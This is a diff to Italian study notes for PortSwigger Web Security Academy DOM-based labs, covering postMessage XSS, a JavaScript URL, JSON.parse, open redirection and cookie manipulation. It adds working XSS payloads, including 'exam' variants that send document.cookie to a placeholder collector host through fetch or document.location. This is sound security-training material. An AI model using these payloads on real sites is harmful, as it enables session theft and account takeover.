@@ -91,7 +91,14 @@ git-cola --repo TARGET.web-security-academy.net/
 
 - Segnale: la pagina ha un `window.addEventListener('message', ...)` pensato per gestire annunci, che inserisce `e.data` direttamente nel DOM (es. come `innerHTML` di un `div`), senza controllare `e.origin` né fare encoding del contenuto.
 - Soluzione: ospitare un iframe che carica la pagina vulnerabile e, al suo `onload`, invia un `postMessage` con un tag che sfrutta un gestore di errore per eseguire codice (dato che un `<script>` iniettato via `innerHTML` non si esegue), con `targetOrigin` `'*'`.
-- Payload: `<iframe src="https://TARGET/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`
+- Payload:
+```html
+<iframe src="https://TARGET/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
+```
+- Payload da esame (Burp Collaborator/OAST): esfiltra il cookie codificato in base64 verso il collector, invece di limitarsi a chiamare `print()`.
+```html
+<iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=fetch(`https://OASTIFY.COM?collector=`+btoa(document.cookie))>','*')">
+```
 - Link: [DOM XSS using web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages)
 - Step: 1
 
@@ -99,16 +106,35 @@ git-cola --repo TARGET.web-security-academy.net/
 
 - Segnale: l'event listener contiene un controllo debole con `indexOf()` che cerca la stringa `"http:"` (o `"https:"`) ovunque all'interno del messaggio, prima di passare il valore al sink `location.href`.
 - Soluzione: inviare come dato del messaggio un payload `javascript:` che contiene anche, da qualche parte nella stringa (es. dopo un commento `//`), la sottostringa `"http:"` richiesta dal controllo, così da superarlo e far eseguire l'URL al sink.
-- Payload: `this.contentWindow.postMessage('javascript:print()//http:','*')`
-- Payload da esame (Burp Collaborator/OAST): `<iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('javascript:document.location=\`https://OASTIFY.COM?c=\`+document.cookie','*')">` — qui il check passa da solo, perché l'URL del payload inizia già con `https:`, che contiene la sottostringa `http:` richiesta dal controllo (non serve aggiungere `//http:` a mano).
+- Payload:
+```html
+<iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
+```
+- Payload da esame (Burp Collaborator/OAST): qui il check passa da solo, perché l'URL del collector inizia già con `https:`, che contiene la sottostringa `http:` richiesta dal controllo (non serve aggiungere `//http:` a mano).
+```html
+<iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('javascript:document.location=`https://OASTIFY.COM?c=`+document.cookie','*')">
+```
 - Link: [DOM XSS using web messages and a JavaScript URL](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url)
 - Step: 1
 
 **3. DOM XSS using web messages and JSON.parse**
 
 - Segnale: l'event listener fa `JSON.parse(e.data)` prima di usare il risultato: si aspetta una proprietà `type`, e in un `switch` il case corrispondente (es. `"load-channel"`) assegna la proprietà `url` del messaggio al `src` di un iframe interno, senza controllare `e.origin` né validare lo schema dell'URL.
-- Soluzione: ospitare un iframe che carica la pagina vulnerabile e, al suo `onload`, invia un `postMessage` con una stringa JSON che imposta `type` sul valore atteso dal `switch` e `url` su un payload `javascript:`, sfruttando l'assenza di controllo sull'origine e sullo schema per far eseguire il payload come `src` dell'iframe interno.
-- Payload: `this.contentWindow.postMessage('{"type":"load-channel","url":"javascript:print()"}','*')`
+- Soluzione: ospitare un iframe che carica la pagina vulnerabile e, al suo `onload`, invia un `postMessage` con la stringa JSON serializzata (`JSON.stringify`) sotto, che imposta `type` sul valore atteso dal `switch` e `url` su un payload `javascript:`, sfruttando l'assenza di controllo sull'origine e sullo schema per far eseguire il payload come `src` dell'iframe interno.
+- Payload (contenuto del messaggio):
+```json
+{
+    "type": "load-channel",
+    "url": "javascript:print()"
+}
+```
+- Payload da esame (Burp Collaborator/OAST): esfiltra il cookie invece di chiamare `print()`.
+```json
+{
+    "type": "load-channel",
+    "url": "JavaScript:document.location='https://OASTIFY.COM?c='+document.cookie"
+}
+```
 - Link: [DOM XSS using web messages and JSON.parse](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)
 - Step: 1
 
@@ -118,7 +144,10 @@ git-cola --repo TARGET.web-security-academy.net/
 
 - Segnale: un link (es. "Back to Blog") usa una regex come `/url=(https?:\/\/.+)/` per estrarre un parametro `url` dalla query string corrente (`location`) e, se trovato, lo assegna al sink `location.href`; se non trovato, il fallback va alla home.
 - Soluzione: costruire e visitare direttamente un URL che include un parametro `url` puntato all'exploit server: la regex lo estrae e il sink ci reindirizza, senza bisogno di iframe o postMessage.
-- Payload: `https://TARGET/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/`
+- Payload:
+```
+https://TARGET/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/
+```
 - Link: [DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)
 - Step: 1
 
@@ -126,7 +155,10 @@ git-cola --repo TARGET.web-security-academy.net/
 
 - Segnale: la pagina usa un cookie client-side (es. `lastViewedProduct`) il cui valore è preso dall'URL della pagina visitata (es. una pagina prodotto) e viene poi riflesso altrove (es. in home) senza HTML-encoding.
 - Soluzione: usare un iframe che carica, come primo URL, una pagina prodotto con un payload XSS appeso al parametro (es. dopo una chiusura di attributo), così il valore sporco viene salvato nel cookie; al suo `onload`, reindirizzare subito l'iframe alla home (con un flag per farlo solo una volta), dove il cookie avvelenato viene riflesso ed eseguito.
-- Payload: `<iframe src="https://TARGET/product?productId=1&'><script>print()</script>" onload="if(!window.x){window.x=1;this.src='https://TARGET/'}">`
+- Payload:
+```html
+<iframe src="https://TARGET/product?productId=1&'><script>print()</script>" onload="if(!window.x){window.x=1;this.src='https://TARGET/'}">
+```
 - Link: [DOM-based cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation)
 - Step: 1
 
